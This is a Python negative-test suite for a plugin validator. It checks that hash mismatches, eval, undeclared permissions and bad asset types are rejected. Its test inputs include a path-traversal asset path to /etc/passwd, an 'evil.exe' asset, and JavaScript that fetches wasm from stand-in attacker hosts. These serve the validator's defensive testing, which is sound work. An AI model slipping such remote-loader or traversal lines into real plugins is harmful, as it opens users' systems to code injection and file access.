#!/usr/bin/env python3
"""validate.py 的负向测试：证明每条新护栏都真的会拒绝，而不是形同虚设。

每个 case 在临时目录里造一个插件，跑校验器，断言"必须报错且错误信息包含关键字"。
正向 case 断言"必须通过"。这样才能区分"规则生效"与"规则被写成了永真"。
"""
import hashlib
import json
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
VALIDATE = REPO / 'tools' / 'validate.py'

GOOD_JS = "(function () {\n  if (window.__miguPlugin_t) return;\n  window.__miguPlugin_t = 1;\n})();\n"

BASE_META = {
    "id": "tplug", "name": "测试", "version": "1.0.0", "author": "tester",
    "description": "负向测试用插件。", "match": ["*"], "minAppVersion": "2.14.0",
}


def run_case(name, meta, js, files=None, expect_ok=False, expect_msg=None):
    tmp = Path(tempfile.mkdtemp())
    try:
        pdir = tmp / 'plugins' / meta['id']
        pdir.mkdir(parents=True)
        (pdir / 'plugin.json').write_text(json.dumps(meta, ensure_ascii=False), encoding='utf-8')
        (pdir / 'main.js').write_text(js, encoding='utf-8')
        (pdir / 'README.md').write_text('# t\n', encoding='utf-8')
        for rel, blob in (files or {}).items():
            f = pdir / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_bytes(blob)
        shutil.copytree(REPO / 'tools', tmp / 'tools')
        r = subprocess.run([sys.executable, str(tmp / 'tools' / 'validate.py')],
                           capture_output=True, text=True, cwd=tmp)
        out = r.stdout + r.stderr
        ok = (r.returncode == 0)
        if expect_ok:
            passed = ok
            detail = 'expected PASS' if not passed else ''
        else:
            passed = (not ok) and (expect_msg is None or expect_msg in out)
            if ok:
                detail = f'expected REJECT (msg~"{expect_msg}") but PASSED'
            elif expect_msg and expect_msg not in out:
                detail = f'rejected but msg missing "{expect_msg}"'
            else:
                detail = ''
        print(('PASS  ' if passed else 'FAIL  ') + name + (('  <- ' + detail) if detail else ''))
        if not passed:
            print('        output: ' + out.strip().replace('\n', '\n        ')[:600])
        return passed
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def sha(b):
    return hashlib.sha256(b).hexdigest()


def main():
    results = []
    wasm_blob = b'\x00asm\x01\x00\x00\x00' + b'\x00' * 400
    data_blob = json.dumps({"pts": [[1, 2], [3, 4]]}).encode()

    # --- 正向：普通插件（不用新特性）仍须通过 ---
    results.append(run_case('baseline plain plugin passes',
                            dict(BASE_META), GOOD_JS, expect_ok=True))

    # --- 正向：完整声明的 wasm + 大资源插件须通过 ---
    meta_ok = dict(BASE_META, permissions=['wasm', 'large-assets', 'frame-capture'],
                   assets=[{"path": "cv.wasm", "sha256": sha(wasm_blob)},
                           {"path": "data/pts.json", "sha256": sha(data_blob)}])
    js_wasm = ("(function () {\n  if (window.__miguPlugin_t) return;\n"
               "  window.__miguPlugin_t = 1;\n  WebAssembly.instantiate(new ArrayBuffer(8));\n})();\n")
    results.append(run_case('wasm+assets plugin with correct sha256 passes',
                            meta_ok, js_wasm,
                            files={'cv.wasm': wasm_blob, 'data/pts.json': data_blob},
                            expect_ok=True))

    # --- 负向：sha256 不匹配（被篡改的资源）必须拒绝 ---
    meta_bad = dict(BASE_META, permissions=['wasm', 'large-assets'],
                    assets=[{"path": "cv.wasm", "sha256": sha(b'different')}])
    results.append(run_case('tampered asset (sha mismatch) is rejected',
                            meta_bad, js_wasm, files={'cv.wasm': wasm_blob},
                            expect_msg='sha256 mismatch'))

    # --- 负向：未申报 large-assets 权限就带 assets ---
    results.append(run_case('assets without large-assets permission rejected',
                            dict(BASE_META, permissions=['wasm'],
                                 assets=[{"path": "cv.wasm", "sha256": sha(wasm_blob)}]),
                            js_wasm, files={'cv.wasm': wasm_blob},
                            expect_msg='require the "large-assets" permission'))

    # --- 负向：未申报 wasm 权限却用 WebAssembly / new Function ---
    results.append(run_case('WebAssembly without wasm permission rejected',
                            dict(BASE_META),
                            "(function(){ new Function('return 1'); })();\n",
                            expect_msg='new Function()'))

    # --- 负向：eval 即使有 wasm 权限也必须拒绝（不能被权限一并放开） ---
    results.append(run_case('eval still banned even with wasm permission',
                            dict(BASE_META, permissions=['wasm']),
                            "(function(){ eval('1+1'); })();\n",
                            expect_msg='eval()'))

    # --- 负向：路径穿越 ---
    results.append(run_case('path traversal in asset path rejected',
                            dict(BASE_META, permissions=['large-assets'],
                                 assets=[{"path": "../../etc/passwd", "sha256": sha(b'x')}]),
                            GOOD_JS, expect_msg='invalid path'))

    # --- 负向：不允许的资源扩展名（真正禁止的类型，如可执行/压缩包）---
    results.append(run_case('disallowed asset extension rejected',
                            dict(BASE_META, permissions=['large-assets'],
                                 assets=[{"path": "evil.exe", "sha256": sha(b'x')}]),
                            GOOD_JS, files={'evil.exe': b'x'},
                            expect_msg='not allowed'))

    # --- .js 资产：只有声明 wasm 权限才允许（emscripten 胶水层的现实需要）---
    glue = b'/* emscripten glue */\nvar Module={};\n'
    results.append(run_case('.js asset without wasm permission rejected',
                            dict(BASE_META, permissions=['large-assets'],
                                 assets=[{"path": "vendor/cv.js",
                                          "sha256": sha(glue)}]),
                            GOOD_JS, files={'vendor/cv.js': glue},
                            expect_msg='needs the "wasm" permission'))
    results.append(run_case('.js asset WITH wasm permission passes',
                            dict(BASE_META,
                                 permissions=['wasm', 'large-assets'],
                                 assets=[{"path": "vendor/cv.js",
                                          "sha256": sha(glue)}]),
                            js_wasm, files={'vendor/cv.js': glue},
                            expect_ok=True))
    # --- 负向：.js 资产被篡改，即使权限齐全也必须拒（哈希是最后防线）---
    results.append(run_case('tampered .js asset rejected even with wasm perm',
                            dict(BASE_META,
                                 permissions=['wasm', 'large-assets'],
                                 assets=[{"path": "vendor/cv.js",
                                          "sha256": sha(b'other bytes')}]),
                            js_wasm, files={'vendor/cv.js': glue},
                            expect_msg='sha256 mismatch'))

    # --- 负向：单个资源超限 ---
    big = b'\x00' * (12 * 1024 * 1024 + 1)
    results.append(run_case('oversized single asset rejected',
                            dict(BASE_META, permissions=['large-assets'],
                                 assets=[{"path": "big.bin", "sha256": sha(big)}]),
                            GOOD_JS, files={'big.bin': big},
                            expect_msg='max'))

    # --- 负向：未知权限名 ---
    results.append(run_case('unknown permission rejected',
                            dict(BASE_META, permissions=['root']),
                            GOOD_JS, expect_msg='unknown permission'))

    # --- 负向：外部网络主机（把插件变成远程加载器） ---
    results.append(run_case('external network host rejected',
                            dict(BASE_META),
                            "(function(){ fetch('https://evil.example.com/a.wasm'); })();\n",
                            expect_msg='external network host'))

    # --- 负向：assets 声明了但文件不存在 ---
    results.append(run_case('missing asset file rejected',
                            dict(BASE_META, permissions=['large-assets'],
                                 assets=[{"path": "gone.bin", "sha256": sha(b'x')}]),
                            GOOD_JS, expect_msg='missing file'))

    # --- hosts 白名单（remote-tiles） ---
    js_tile = ("(function(){ var i=new Image(); "
               "i.src='https://tiles.example.com/1/2_3.png'; })();\n")
    # 正向：显式登记 + 权限齐全须通过
    results.append(run_case('declared host with remote-tiles passes',
                            dict(BASE_META, permissions=['remote-tiles'],
                                 hosts=['tiles.example.com']),
                            js_tile, expect_ok=True))
    # 负向：登记了 hosts 但没申报 remote-tiles 权限
    results.append(run_case('hosts without remote-tiles permission rejected',
                            dict(BASE_META, hosts=['tiles.example.com']),
                            js_tile, expect_msg='require the "remote-tiles" permission'))
    # 负向：代码访问了未登记的主机（登记了 A 却访问 B）
    results.append(run_case('undeclared host still rejected',
                            dict(BASE_META, permissions=['remote-tiles'],
                                 hosts=['tiles.example.com']),
                            "(function(){ fetch('https://evil.example.net/x.wasm'); })();\n",
                            expect_msg='is not declared'))
    # 负向：hosts 里写 URL 而不是裸主机名（防止 path 级白名单误解）
    results.append(run_case('host with path/url form rejected',
                            dict(BASE_META, permissions=['remote-tiles'],
                                 hosts=['https://tiles.example.com/a/']),
                            js_tile, expect_msg='invalid host'))

    ok = sum(results)
    print(f'\n{ok}/{len(results)} cases passed')
    return 0 if ok == len(results) else 1


if __name__ == '__main__':
    sys.exit(main())
